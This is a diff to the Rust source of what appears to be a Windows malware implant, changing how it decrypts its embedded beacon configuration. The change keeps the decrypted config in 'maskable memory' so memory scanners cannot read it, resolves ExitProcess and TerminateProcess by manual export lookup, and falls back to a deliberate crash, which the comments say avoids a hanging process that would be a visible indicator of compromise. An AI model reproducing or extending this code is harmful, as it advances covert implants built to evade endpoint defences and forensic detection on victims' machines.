@@ -41,17 +41,20 @@ mod baked {
 /// embedded config was tampered with (Poly1305 tag mismatch) or the build is
 /// broken (blob shape wrong). Panics on either — the implant cannot beacon
 /// without a config.
-pub fn load() -> Config {
+///
+/// Returns `(Config, Vec<u8>)` — the decoded config and the raw decrypted
+/// plaintext bytes. The caller MUST leak the `Vec<u8>` (via
+/// [`mem::register_owned`]) so the plaintext sits in maskable memory for the
+/// process lifetime. This prevents memory scanners from reading the decrypted
+/// config at rest.
+pub fn load() -> (Config, Vec<u8>) {
     let plain: Vec<u8> = nyx_config::decrypt(&baked::CONFIG_KEY, &baked::CONFIG_NONCE, baked::CONFIG_CT);
     match decode(&plain) {
-        Ok(c) => c,
+        Ok(c) => (c, plain),
         Err(_) => {
             // Tampered or malformed baked config — the implant cannot proceed.
-            // Resolve ExitProcess directly (same pattern as the panic handler
-            // in lib.rs) and exit, rather than panic!ing: under no_std the
-            // core panic machinery defaults to unwinding and the build does not
-            // rebuild core with -Zbuild-std panic=abort, so a panic! here would
-            // fail to link. A clean exit achieves the same "abort" semantics.
+            // Try ExitProcess → TerminateProcess → int3 in order. A crash is
+            // better than a hanging process (visible IOC).
             unsafe {
                 if let Some(addr) =
                     crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess")
@@ -59,8 +62,17 @@ pub fn load() -> Config {
                     let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
                     f(0xC000_0001);
                 }
+                // ExitProcess failed — try TerminateProcess.
+                if let Some(addr) =
+                    crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
+                {
+                    type FnTerm = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+                    let f: FnTerm = core::mem::transmute(addr);
+                    f((-1isize) as *mut core::ffi::c_void, 1);
+                }
+                // Last resort: clean crash (distinguishable from hang).
+                core::arch::asm!("int3");
             }
-            // Defensive trap if ExitProcess could not be resolved (ntdll gone).
             loop {
                 core::hint::spin_loop();
             }
